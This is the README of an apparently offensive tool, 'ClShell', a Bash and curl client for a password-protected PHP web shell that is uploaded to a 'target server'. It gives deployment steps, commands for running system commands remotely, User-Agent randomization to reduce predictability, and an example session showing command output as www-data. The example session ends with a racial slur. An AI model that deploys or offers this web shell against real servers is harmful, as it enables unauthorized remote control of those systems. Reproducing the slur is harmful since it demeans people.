![Banner](s.png)

# ClShell - Simple PHP Shell Client

ClShell is a lightweight Bash-based client for interacting with a remote PHP shell. It enables seamless command execution on a target system through a minimal HTTP interface. Designed for simplicity and efficiency in controlled environments.

## Features

- Interactive terminal interface for real-time command execution  
- Password-protected communication with the remote shell  
- Randomized User-Agent headers to reduce predictability  
- No external dependencies — uses only `bash` and `curl`  
- Compatible with Linux, macOS, and WSL  
- Lightweight and portable — easy to deploy and run  

## Components

- **shell.php** – Minimal PHP script deployed on the target server to execute system commands  
- **ClShell.sh** – Local Bash client for sending commands and receiving output  

## Setup

### 1. Deploy the PHP Shell

Upload `shell.php` to the target server in a directory accessible via the web (e.g., `/var/www/html/`).  

Ensure the web server is running and the file is reachable.  
Access it via browser or `curl` to verify:  
```
http://target.com/shell.php
```

Edit the password in `shell.php` for security:  
```php
$PASSWORD = "lah";
```
Change `"lah"` to a strong, unique value.

### 2. Prepare the Client on Your Machine

Download or clone the ClShell directory to your local system.  
Navigate into the project folder:  
```bash
cd /home/user/ClShell
```

Make the script executable:  
```bash
chmod +x ClShell.sh
```

Verify the script is ready:  
```bash
ls -l ClShell.sh
```
You should see the `x` permission (e.g., `-rwxr-xr-x`).

## How to Run Using Bash

This script **does not require `./`** — you can run it directly using the `bash` command.

### Full Execution Command

```bash
bash ClShell.sh -u http://target.com/shell.php --pass lah
```

### Step-by-Step Execution

1. Open your terminal  
2. Navigate to the ClShell directory  
   ```bash
   cd /path/to/ClShell
   ```
3. Run the script using `bash`  
   ```bash
   bash ClShell.sh -u http://10.10.10.100/shell.php --pass secret123
   ```
4. Wait for the prompt to appear  
   ```bash
   > 
   ```
5. Type any system command  
   ```bash
   > whoami
   > pwd
   > ls -la /tmp
   ```
6. To exit, type  
   ```bash
   exit
   ```

### Example Session

```bash
user@kali:~/ClShell$ bash ClShell.sh -u http://192.168.1.50/shell.php --pass mypass
> whoami
www-data
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
> uname -a
Linux webserver 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3
> exit
[OK] nigga
```

## Expected Output

- If the URL or password is wrong: `[DEENIED]` or `[MISSING PARAMETER]`  
- If connection fails: `curl` error (e.g., "Could not resolve host")  
- On success: blank prompt (`>`) ready for input  

## Troubleshooting

| Issue | Solution |
|------|---------|
| `bash: command not found` | Ensure you are in the correct directory |
| `curl: command not found` | Install curl: `sudo apt install curl` |
| No output or blank response | Check if `shell.php` is accessible in browser |
| `403 Forbidden` | Verify file permissions and web server configuration |
| `500 Internal Server Error` | Check PHP syntax in `shell.php` |
